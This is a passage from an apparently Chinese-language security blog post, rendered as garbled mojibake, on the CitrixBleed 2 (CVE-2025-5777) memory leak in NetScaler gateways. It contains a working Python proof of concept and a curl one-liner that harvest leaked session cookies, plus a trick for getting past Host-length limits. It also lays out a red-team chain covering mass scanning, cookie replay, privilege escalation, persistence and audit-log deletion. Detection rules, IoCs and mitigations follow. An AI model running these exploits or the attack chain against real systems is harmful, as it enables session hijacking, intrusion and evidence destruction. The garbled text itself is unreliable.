<p><code>read()</code> ç»“æœæ˜¾ç¤ºå 1 600 å­—èŠ‚æ¥è‡ªæœªåˆå§‹åŒ–å†…å­˜ï¼Œå…¶ä¸­å¯è§å…¶ä»– SSL ä¼šè¯çš„ Cookie ç¼“å†²åŒºã€‚</p>
<h4 id="3-4-æ³„éœ²çš„æ•°æ®ç±»åˆ«"><a href="#3-4-æ³„éœ²çš„æ•°æ®ç±»åˆ«" class="headerlink" title="3.4  æ³„éœ²çš„æ•°æ®ç±»åˆ«"></a>3.4  æ³„éœ²çš„æ•°æ®ç±»åˆ«</h4><table>
<thead>
<tr>
<th>åˆ†ç±»</th>
<th>ç¤ºèŒƒç‰‡æ®µï¼ˆå·²è„±æ•ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td>Session Cookie</td>
<td><code>Set-Cookie: NSC_USER=john.doe;NSC_TASS=abc123...</code></td>
</tr>
<tr>
<td>MFA&#x2F;OTP Token</td>
<td><code>radius_state=0e2a9c6d1553...</code></td>
</tr>
<tr>
<td>å…¶ä»–è¯·æ±‚ä½“</td>
<td><code>&lt;username&gt;audituser&lt;/username&gt;&lt;password&gt;***&lt;/password&gt;</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="0x04-PoC-å®ç°"><a href="#0x04-PoC-å®ç°" class="headerlink" title="0x04  PoC å®ç°"></a>0x04  PoC å®ç°</h3><h4 id="4-1-å•æ–‡ä»¶-Pythonï¼ˆ15-è¡Œï¼‰"><a href="#4-1-å•æ–‡ä»¶-Pythonï¼ˆ15-è¡Œï¼‰" class="headerlink" title="4.1  å•æ–‡ä»¶ Pythonï¼ˆ15 è¡Œï¼‰"></a>4.1  å•æ–‡ä»¶ Pythonï¼ˆ15 è¡Œï¼‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">## CVE-2025-5777 Minimal PoC  (authorized testing ONLY)</span><br><span class="hljs-keyword">import</span> requests, sys, urllib3, re<br>urllib3.disable_warnings()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    exit(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> https://NSVIP&quot;</span>)<br><br>url = sys.argv[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">&quot;/&quot;</span>) + <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>hdr = &#123;<span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x6000</span>&#125;               <span class="hljs-comment"># &gt;0x1800 triggers</span><br>r = requests.get(url, headers=hdr, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] HTTP&quot;</span>, r.status_code, <span class="hljs-string">&quot;bytes:&quot;</span>, <span class="hljs-built_in">len</span>(r.content))<br>hits = re.findall(<span class="hljs-string">br&quot;(NSC_[A-Z]+=[^;]&#123;10,&#125;)&quot;</span>, r.content)<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> hits: <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Cookie leak -&gt;&quot;</span>, h.decode())<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;leak.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Saved leak.bin for offline grep.&quot;</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œåå¦‚è¿”å› 200 + æ•° KBï¼Œå³åˆ¤å®šå­˜åœ¨æ¼æ´ã€‚</li>
<li>è¿›ä¸€æ­¥ä» <code>leak.bin</code> æœç´¢ <code>Cookie=</code>ã€<code>&lt;AuthenticateContext&gt;</code> ç­‰å…³é”®å­—ã€‚</li>
</ul>
<h4 id="4-2-Bash-curl-å•è¡Œ"><a href="#4-2-Bash-curl-å•è¡Œ" class="headerlink" title="4.2  Bash &#x2F; curl å•è¡Œ"></a>4.2  Bash &#x2F; curl å•è¡Œ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -ks -H <span class="hljs-string">&quot;Host: <span class="hljs-subst">$(python -c &#x27;print(\&quot;A\&quot;*6000)</span>&#x27;)&quot;</span> \<br>     https://NSVIP/nf/auth/startwebview.do -o leak.bin<br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong>æ—è·¯</strong>ï¼šéƒ¨åˆ†è®¾å¤‡åœ¨å‰ç½® F5 &#x2F; Nginx åšäº† <code>Host</code> é•¿åº¦é™åˆ¶ï¼›å¯æ”¹ä¸ºå¤šæ®µå­åŸŸæ‹¼æ¥ç»•è¿‡ï¼Œå¦‚<br><code>foo.foo.foo.â€¦foo.example.com</code>ï¼ˆé‡å¤ 3000 æ¬¡ <code>foo</code>ï¼‰ã€‚</p>
</blockquote>
<hr>
<h3 id="0x05-çº¢é˜Ÿè§†è§’ï¼šå®Œæ•´æ”»å‡»é“¾"><a href="#0x05-çº¢é˜Ÿè§†è§’ï¼šå®Œæ•´æ”»å‡»é“¾" class="headerlink" title="0x05  çº¢é˜Ÿè§†è§’ï¼šå®Œæ•´æ”»å‡»é“¾"></a>0x05  çº¢é˜Ÿè§†è§’ï¼šå®Œæ•´æ”»å‡»é“¾</h3><table>
<thead>
<tr>
<th>æ­¥éª¤</th>
<th>ç›®çš„ &amp; æŠ€å·§</th>
</tr>
</thead>
<tbody><tr>
<td>â‘  èµ„äº§å‘ç°</td>
<td><code>zoomeye search &quot;http.title:\&quot;NetScaler Gateway\&quot;&quot;</code> + Shodan ç­‰ï¼›è¿‡æ»¤ <code>set-cookie: NSC_</code></td>
</tr>
<tr>
<td>â‘¡ POC æ³„éœ²</td>
<td>æ‰¹é‡è„šæœ¬å¹¶è¡Œè¯·æ±‚ï¼›æŠ“å– <code>NSC_USER= ; NSC_TASS=</code></td>
</tr>
<tr>
<td>â‘¢ Cookie é‡æ’­</td>
<td>Chrome DevToolsâ†’Applicationâ†’Cookiesâ†’æ·»åŠ æ¡ç›®ï¼Œåˆ·æ–° <code>/vpn/index.html</code></td>
</tr>
<tr>
<td>â‘£ å†…ç½‘èµ„æº</td>
<td>è®¿é—® <code>storeweb/#home</code> è·å– RDP æ–‡ä»¶ï¼›ä¸‹è½½ <code>.ica</code> ç›´æ¥ç™»é™† VDI</td>
</tr>
<tr>
<td>â‘¤ æƒé™æå‡</td>
<td>å†…éƒ¨å‡­æ®å–·å°„ã€Kerberoastã€ADCS ESC1ï¼›æˆ–åˆ©ç”¨åŒç½‘æ®µå¼±å£ä»¤ SMB</td>
</tr>
<tr>
<td>â‘¥ æŒä¹…åŒ–</td>
<td>æ–°å»º Scheduled Taskï¼›æ³¨å†Œè‡ªå¯åŠ¨è„šæœ¬ï¼›æˆ–ä¿®æ”¹ NetScaler vDiskï¼ˆé«˜æƒé™éœ€è¿ç»´ç–å¿½ï¼‰</td>
</tr>
<tr>
<td>â‘¦ ç—•è¿¹æ¸…ç†</td>
<td>Cookie ç”¨åå³ç„šï¼›åˆ é™¤ audit æ—¥å¿—ï¼ˆè‹¥æ‹¿åˆ° NS rootï¼‰ï¼›æˆ–åˆ©ç”¨ logrotate race è¦†ç›–</td>
</tr>
</tbody></table>
<p>çœŸå®æ¡ˆä¾‹ï¼šReliaQuest åœ¨å®¢æˆ·ç½‘å…³è§‚å¯Ÿåˆ°â€œçŸ­æ—¶å¤§é‡ 6 KB+ <code>Host</code> å¤´è¯·æ±‚ â†’ ç´§è·Ÿç€ä¼šè¯è¢«ç›—ç”¨â€(<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)ã€‚</p>
<hr>
<h3 id="0x06-è“é˜Ÿè§†è§’ï¼šæ£€æµ‹ã€å–è¯ä¸è¡¥ä¸éªŒè¯"><a href="#0x06-è“é˜Ÿè§†è§’ï¼šæ£€æµ‹ã€å–è¯ä¸è¡¥ä¸éªŒè¯" class="headerlink" title="0x06  è“é˜Ÿè§†è§’ï¼šæ£€æµ‹ã€å–è¯ä¸è¡¥ä¸éªŒè¯"></a>0x06  è“é˜Ÿè§†è§’ï¼šæ£€æµ‹ã€å–è¯ä¸è¡¥ä¸éªŒè¯</h3><h4 id="6-1-æ—¥å¿—ä¸-IoC"><a href="#6-1-æ—¥å¿—ä¸-IoC" class="headerlink" title="6.1  æ—¥å¿—ä¸ IoC"></a>6.1  æ—¥å¿—ä¸ IoC</h4><table>
<thead>
<tr>
<th>æ¥æº</th>
<th>è¡¨ç°</th>
</tr>
</thead>
<tbody><tr>
<td><strong>&#x2F;var&#x2F;log&#x2F;ns.log</strong></td>
<td><code>AAA_TRANSACTION &lt;client_ip&gt; - Host header length: 6144</code></td>
</tr>
<tr>
<td><strong>HTTP_ACCESS.log</strong></td>
<td><code>/nf/auth/startwebview.do</code> è¯·æ±‚è€—æ—¶æçŸ­ä½†å“åº”å¤§å°å¼‚å¸¸ï¼ˆ&gt; 2 KBï¼‰</td>
</tr>
<tr>
<td><strong>EDR&#x2F;PCAP</strong></td>
<td><code>Set-Cookie: NSC_USER=</code> å‡ºç°åœ¨éç™»å½•è¯·æ±‚çš„å“åº”ä¸­</td>
</tr>
</tbody></table>
<h4 id="6-2-Sigma-è§„åˆ™ï¼ˆç®€è¦ç‰ˆï¼‰"><a href="#6-2-Sigma-è§„åˆ™ï¼ˆç®€è¦ç‰ˆï¼‰" class="headerlink" title="6.2  Sigma è§„åˆ™ï¼ˆç®€è¦ç‰ˆï¼‰"></a>6.2  Sigma è§„åˆ™ï¼ˆç®€è¦ç‰ˆï¼‰</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span> <span class="hljs-string">OOB</span> <span class="hljs-string">Leak</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">category:</span> <span class="hljs-string">webserver</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">cs-bytes|gt:</span> <span class="hljs-number">2048</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure>

<h4 id="6-3-è¡¥ä¸éªŒè¯è„šæœ¬"><a href="#6-3-è¡¥ä¸éªŒè¯è„šæœ¬" class="headerlink" title="6.3  è¡¥ä¸éªŒè¯è„šæœ¬"></a>6.3  è¡¥ä¸éªŒè¯è„šæœ¬</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nscli -s 127.0.0.1:3008 \<br>      -c <span class="hljs-string">&quot;show ns version&quot;</span> | grep -E <span class="hljs-string">&quot;13\.1-58\.32|14\.1-43\.56&quot;</span> \<br>      &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Patched âœ…&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Vulnerable âŒ&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="6-4-Kill-ä¼šè¯"><a href="#6-4-Kill-ä¼šè¯" class="headerlink" title="6.4  Kill ä¼šè¯"></a>6.4  Kill ä¼šè¯</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## æ¸…é™¤å…¨éƒ¨æ´»åŠ¨ VPN/ICA è¿æ¥</span><br><span class="hljs-built_in">kill</span> icaconnection -all<br><span class="hljs-built_in">kill</span> vpn -all<br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šè¡¥ä¸åä»éœ€å¼ºåˆ¶æ³¨é”€ï¼Œé˜²æ­¢æ”»å‡»è€…ç»§ç»­ä½¿ç”¨å·²çªƒå– Cookieã€‚</p>
</blockquote>
<hr>
<h3 id="0x07-é˜²å¾¡åŠ å›º"><a href="#0x07-é˜²å¾¡åŠ å›º" class="headerlink" title="0x07  é˜²å¾¡åŠ å›º"></a>0x07  é˜²å¾¡åŠ å›º</h3><ol>
<li><strong>å®˜æ–¹è¡¥ä¸</strong>ï¼šå‡è‡³ â‰¥ 14.1-43.56 &#x2F; 13.1-58.32ï¼Œæˆ–å¯¹ FIPS&#x2F;NDcPP æœºå‹å¥—ç”¨å¯¹åº”ç‰ˆæœ¬ (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)ã€‚</li>
<li><strong>Host Header é•¿åº¦é™åˆ¶</strong>ï¼ˆä¸´æ—¶æªæ–½ï¼‰</li>
</ol>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">map</span> <span class="hljs-variable">$http_host</span> <span class="hljs-variable">$block_long_host</span> &#123;<br>    <span class="hljs-attribute">default</span>          <span class="hljs-number">0</span>;<br>    &quot;~^.&#123;4097,&#125;$&quot;    1;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    ...<br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$block_long_host</span>) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">413</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>WAF è‡ªé€‚åº”è§„åˆ™</strong>ï¼šå¯¹ <code>/nf/auth/</code> &amp; <code>/oauth/</code> è·¯å¾„å¯ç”¨é€Ÿç‡é™åˆ¶ (e.g. 20 req&#x2F;m)ã€‚</li>
<li><strong>èµ„äº§æ¸…ç‚¹</strong>ï¼šEOL ç‰ˆæœ¬ 12.1&#x2F;13.0 æ°¸è¿œä¸å†æ”¶åˆ°å®˜æ–¹è¡¥ä¸ï¼Œè®¡åˆ’æ›¿æ¢æˆ–å¼ºéš”ç¦» (<a target="_blank" rel="noopener" href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)ã€‚</li>
<li><strong>MFA å®‰å…¨</strong>ï¼šä¼šè¯æ³„éœ²ç»•è¿‡ MFA â†’ å»ºè®®å¼€å¯â€œæ¯è¯·æ±‚ç­¾åâ€æˆ–â€œåŠ¨æ€ç»‘å®šç¡¬ä»¶æŒ‡çº¹â€ï¼Œè€Œéä»…é¦–ç™»æ—¶éªŒè¯ã€‚</li>
</ol>
<hr>
<h3 id="0x08-å­¦ä¹ -å¤ä¹ è·¯çº¿"><a href="#0x08-å­¦ä¹ -å¤ä¹ è·¯çº¿" class="headerlink" title="0x08  å­¦ä¹  &#x2F; å¤ä¹ è·¯çº¿"></a>0x08  å­¦ä¹  &#x2F; å¤ä¹ è·¯çº¿</h3><table>
<thead>
<tr>
<th>é˜¶æ®µ</th>
<th>å»ºè®®èµ„æ–™ &amp; æ“ä½œ</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ç†è®º</strong></td>
<td>é˜…è¯» Citrix å®‰å…¨å…¬å‘Šã€Arctic Wolf &#x2F; Tenable FAQã€Bishop Fox æŠ€æœ¯æ‹†è§£ (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>, <a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td>
</tr>
<tr>
<td><strong>å®éªŒ</strong></td>
<td>éƒ¨ç½² vuln ç‰ˆ 13.1-55.18ï¼ˆESXi &#x2F; KVMï¼‰ï¼Œè·‘æœ€å° PoCï¼ŒWireshark æŠ“åŒ… â†’ è§‚å¯Ÿ <code>TCP PSH</code> å›åŒ…</td>
</tr>
<tr>
<td><strong>ç¼–ç </strong></td>
<td>æ”¹å†™ PoCï¼šåŠ å…¥è‡ªåŠ¨ Cookie é‡æ’­ã€ZTLS æ‰¹é‡æ‰«æã€å¤šçº¿ç¨‹é˜Ÿåˆ—</td>
</tr>
<tr>
<td><strong>è“é˜Ÿ</strong></td>
<td>ä»¥ä¸¤å°æ—¶ä¸ºçª—å£æœç´¢å¼‚å¸¸ Host é•¿åº¦ï¼›ç”¨ Sigma-â†’Elastic&#x2F;Graylogï¼›å¤ç°å¹¶éªŒè¯ WAF ç­–ç•¥</td>
</tr>
<tr>
<td><strong>åˆ†äº«</strong></td>
<td>ç¼–å†™åšå®¢æˆ–åˆ¶ä½œæ€ç»´å¯¼å›¾ï¼Œæ€»ç»“â€œåŒç±» snprintf ä½¿ç”¨é™·é˜±â€</td>
</tr>
</tbody></table>
<hr>
<h3 id="é™„å½•-A-â€”-æ£€æµ‹-é˜²å¾¡ç‰‡æ®µ"><a href="#é™„å½•-A-â€”-æ£€æµ‹-é˜²å¾¡ç‰‡æ®µ" class="headerlink" title="é™„å½• A â€” æ£€æµ‹ &#x2F; é˜²å¾¡ç‰‡æ®µ"></a>é™„å½• A â€” æ£€æµ‹ &#x2F; é˜²å¾¡ç‰‡æ®µ</h3><details><summary>ğŸ“œ Sigma è§„åˆ™å®Œæ•´ç‰ˆ</summary>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">Netscaler</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Large</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span><br><span class="hljs-attr">id:</span> <span class="hljs-string">4d6f1e1b-0bfe-4473-a732-3e7e9a21f650</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">description:</span> <span class="hljs-string">Detects</span> <span class="hljs-string">abnormal</span> <span class="hljs-string">Host</span> <span class="hljs-string">header</span> <span class="hljs-string">length</span> <span class="hljs-string">in</span> <span class="hljs-string">requests</span> <span class="hljs-string">to</span> <span class="hljs-string">/nf/auth/startwebview.do</span><br><span class="hljs-attr">references:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2025-5777</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">mingshenhk</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br>  <span class="hljs-attr">service:</span> <span class="hljs-string">http_access</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure>

</details>

<details><summary>ğŸ›¡ï¸ Suricata è§„åˆ™</summary>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs suricata">alert http any any -&gt; any any (<br>  msg:&quot;CitrixBleed2 CVE-2025-5777 Host header overflow&quot;;<br>  http.uri; content:&quot;/nf/auth/startwebview.do&quot;; nocase;<br>  http.header; field:Host; content:&quot;AAAAAAAA&quot;; within:0; distance:0; offset:4096;<br>  classtype:attempted-recon;<br>  sid:5777002; rev:1;<br>)<br></code></pre></td></tr></table></figure>

</details>

<details><summary>ğŸ”’ Nginx-Lua Inline Hotpatch</summary>

<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- access_by_lua_block</span><br><span class="hljs-keyword">local</span> host = ngx.var.http_host <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> #host &gt; <span class="hljs-number">4096</span> <span class="hljs-keyword">then</span><br>  ngx.<span class="hljs-built_in">log</span>(ngx.WARN,<span class="hljs-string">&quot;[CitrixBleed2] Blocked Host len=&quot;</span>,#host)<br>  <span class="hljs-keyword">return</span> ngx.<span class="hljs-built_in">exit</span>(ngx.HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

</details>

<hr>
<h3 id="é™„å½•-B-â€”-æ—¶é—´è½´"><a href="#é™„å½•-B-â€”-æ—¶é—´è½´" class="headerlink" title="é™„å½• B â€” æ—¶é—´è½´"></a>é™„å½• B â€” æ—¶é—´è½´</h3><table>
<thead>
<tr>
<th>æ—¥æœŸ (2025)</th>
<th>äº‹ä»¶</th>
</tr>
</thead>
<tbody><tr>
<td>06-17</td>
<td>Citrix åˆæ¬¡å‘å¸ƒ CVE-2025-5777 å…¬å‘Š (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td>
</tr>
<tr>
<td>06-18</td>
<td>Bishop Fox é¦–å‘æŠ€æœ¯æ‹†è§£ &amp; PoC (<a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td>
</tr>
<tr>
<td>06-23</td>
<td>Citrix æ›´æ–°å½±å“èŒƒå›´ + è¡¥ä¸ç‰ˆæœ¬ï¼›CISA å°†å…¶åˆ—å…¥ KEV</td>
</tr>
<tr>
<td>06-25</td>
<td>ReliaQuest æŠ¥å‘Šæ´»è·ƒåˆ©ç”¨ï¼Œå¨èƒç»„æ­£æ‰¹é‡çªƒå–ä¼šè¯ (<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</td>
</tr>
<tr>
<td>06-27</td>
<td>BleepingComputer æŠ¥é“â€œå¯èƒ½å·²å¤§è§„æ¨¡è¢«åˆ©ç”¨â€ (<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</td>
</tr>
<tr>
<td>06-28</td>
<td>å¤šä¸ª GitHub PoC å‡ºç°ï¼›Tenable å‘å¸ƒ FAQ (<a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</td>
</tr>
</tbody></table>
<hr>
<h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ol>
<li>Citrix å®˜æ–¹å®‰å…¨é€šå‘Šä¸è¡¥ä¸è¯´æ˜ (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</li>
<li>Arctic Wolfã€ŠCVE-2025-5777 æŠ€æœ¯ç®€æŠ¥ã€‹ (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</li>
<li>Bishop Foxã€ŠOOB Memory Read in NetScalerã€‹ (<a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</li>
<li>ReliaQuestã€ŠThreat Spotlight: CitrixBleed 2ã€‹ (<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</li>
<li>Tenable FAQ on CVE-2025-5777 (<a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</li>
<li>BleepingComputer å®‰å…¨å¿«è®¯ (<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</li>
<li>NVD CVE-2025-5777 æ¡ç›® (<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-5777?utm_source=chatgpt.com" title="CVE-2025-5777 Detail - NVD">nvd.nist.gov</a>)</li>
<li>Citrix Support KB CTX693420 (<a target="_blank" rel="noopener" href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)</li>
</ol>
<blockquote>
<p><strong>å®Œ</strong> â€” å¸Œæœ›æœ¬æ–‡æ¡£èƒ½å¸®åŠ©ä½ å…¨æ–¹ä½ç†è§£å¹¶åº”å¯¹ CitrixBleed 2ã€‚å¦‚æœéœ€è¦è¿›ä¸€æ­¥è¡¥å……ç¤ºä¾‹ã€è„šæœ¬æˆ–æ¼”ç»ƒæŒ‡å¯¼ï¼Œæ¬¢è¿ç»§ç»­æå‡ºï¼</p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#ä¿¡æ¯æ³„éœ²</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Citrix NetScaler ADC/Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´</div>
